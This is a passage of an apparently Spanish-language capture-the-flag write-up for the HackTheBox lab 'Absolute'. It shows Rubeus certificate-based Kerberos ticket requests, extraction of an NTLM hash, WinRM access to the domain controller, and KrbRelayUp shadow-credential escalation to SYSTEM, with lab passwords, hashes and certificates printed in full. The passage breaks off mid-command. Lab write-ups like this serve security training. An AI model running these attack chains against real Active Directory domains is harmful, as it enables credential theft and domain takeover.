PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:winrm_user /certificate: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 /password:"nC38msY6DYWxnRBx" /domain:absolute.htb /dc:dc.absolute.htb /getcredentials /showPS /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=winrm_user
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\winrm_user'
[*] Using domain controller: 10.129.142.54:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  winrm_user
  UserRealm                :  ABSOLUTE.HTB
  EndTime                  :  08/11/2023 23:30:14
  RenewTill                :  08/11/2023 23:30:14
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  xlFGVb2NSEG/OGT554br/g==
  ASREP (key)              :  908B13B981F87CCB610AE52F5A8F6DE5

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : **8738C7413A5DA3BC1D083EFC0AB06CB2**
```

El comando se ha ejecutado correctamente y ya tenemos el ticket en memoria.

```
PS C:\Users\Alex\Desktop\HTB\Absolute> klist

El id. de inicio de sesión actual es 0:0xb74b2

Vales almacenados en caché: (1)

#0>     Cliente: winrm_user @ ABSOLUTE.HTB
        Servidor: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
        Hora de inicio: 11/6/2023 20:33:13 (local)
        Hora de finalización:   11/6/2023 23:57:59 (local)
        Hora de renovación: 11/6/2023 23:57:59 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:
```

Pues como hemos visto anteriormente el usuario pertenece al grupo de `Remote Managament Users`, por lo que ya podríamos acceder por WinRM al DC. Puede ser que de problemas debido a la configuración de la máquina Windows de atacante.

```
PS C:\Users\Alex\desktop\HTB\Absolute> Enter-PSSession -ComputerName dc.absolute.htb
Enter-PSSession : Error de conexión al servidor remoto dc.absolute.htb. Mensaje de error: El cliente WinRM no puede
procesar la solicitud. Si el esquema de autenticación es distinto de Kerberos o si el equipo cliente no está unido a
lista TrustedHosts. Para obtener más información, ejecute el siguiente comando: winrm help config. Para obtener más
información, consulte el tema de la Ayuda about_Remote_Troubleshooting.
En línea: 1 Carácter: 1
+ Enter-PSSession -ComputerName dc.absolute.htb
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (dc.absolute.htb:String) [Enter-PSSession], PSRemotingTransportExceptio
   n
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
```

Para solucionarlo simplemente ejecutar el siguiente comando, para añadir a absolute como `Trusted Host`

```
PS C:\Users\Alex\desktop\HTB\Absolute> winrm set winrm/config/client '@{TrustedHosts="dc.absolute.htb"}'
Client
    NetworkDelayms = 5000
    URLPrefix = wsman
    AllowUnencrypted = false
    Auth
        Basic = true
        Digest = true
        Kerberos = true
        Negotiate = true
        Certificate = true
        CredSSP = false
    DefaultPorts
        HTTP = 5985
        HTTPS = 5986
    TrustedHosts = dc.absolute.htb
```

Y finalmente obtenemos una shell dentro del sistema.

![img](/assets/img/post/Absolute/20.png)

## Escalada de Privilegios

### KrbRelayUp

Después de tirar Winpeas para enumerar posibles vías de elevar mi privilegio, nos muestra una opción que es `KrbRelayUp`

![img](/assets/img/post/Absolute/34.png)

Este ataque consiste en crear una cuenta de máquina y aprovecharla para realizar un ataque Kerberos Relay en el controlador de dominio con la firma LDAP deshabilitada. Para que el ataque funcione el sistema no debe de estar parcheado desde octubre de 2022, y el LDAP debe no debe de estar firmado (por defecto en Windows).

Podéis obtener más información de este ataque aquí [KrbRelay](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html). Microsoft, lo parcheo hace poco tiempo y antes era una manera habitual de elevar privilegios en AD.

Normalmente con crackmapexec podemos enumerar si LDAP esta firmado o no, pero en está maquina en concreto no funciona. Vamos a suponer que esta sin firmar, ya que es la opción por defecto.

```bash
❯ cme ldap 10.129.142.54 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k  -M ldap-checker
SMB         10.129.142.54   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.142.54   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
LDAP-CHE... 10.129.142.54   389    DC               [-] [!!!] invalid credentials - aborting to prevent unnecessary authentication
```
{: .nolineno }
Podemos comprobar la versión de Windows, podemos ejecutar el siguiente comando.

```
[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
    ProductName    REG_SZ    Windows Server 2019 Standard

```

No tenemos permisos para enumerar los parches instalados en el sistema, pero como esta máquina fue lanzada en septiembre del 2022, es probable que no lo tenga instalado. Así que vamos a clonar el repositorio de [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) para compilarlo en VS Code.

![img](/assets/img/post/Absolute/35.png)
![img](/assets/img/post/Absolute/38.png)

Una vez compilado pasamos el binario a la máquina víctima. Si lo ejecutamos nos dará un error.

![img](/assets/img/post/Absolute/36.png)

Leyendo la documentación del repositorio es necesario de disponer de una sesión interactiva como por ejemplo RDP. Esto lo podemos solucionar con [RunasCS.exe](https://github.com/antonioCoco/RunasCs). Debemos ejecutar el comando como `m.lovegod` ya que es el que tiene permisos para cambiar `msDS-KeyCredentialLink` cambiando el logon type a 9, ya que el 2 y 3 dan problemas debido a que la autenticación NTLM este desactivada para este usuario. 

![img](/assets/img/post/Absolute/37.png)

Al igual que en los Potatoes, es necesario tener un CLSID para un servicio RPC válido. Aquí se pueden encontrar varios [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard). Yo siempre elijo los de `TrustedInstaller`

```
[dc.absolute.htb]: PS C:\programdata\pe> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"

KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID dc6bb9da-2de4-4f0e-a68b-ee27ee606de2
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep kN9=qE6/eA2#
```

El output de KrbRelayUp indica que ejecutó con éxito el ataque, y creó shadow credentials para la cuenta de `DC$`. Ahora puedo tratar de utilizar este certificado con contraseña de una manera diferente. Voy a utilizar Rubeus desde mi máquina Windows, para ello he utilizado el siguiente comando.

>Es importante contar con un ticket para el usuario **m.lovegod**
{: .prompt-warning }

```
PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:DC$ /certificate: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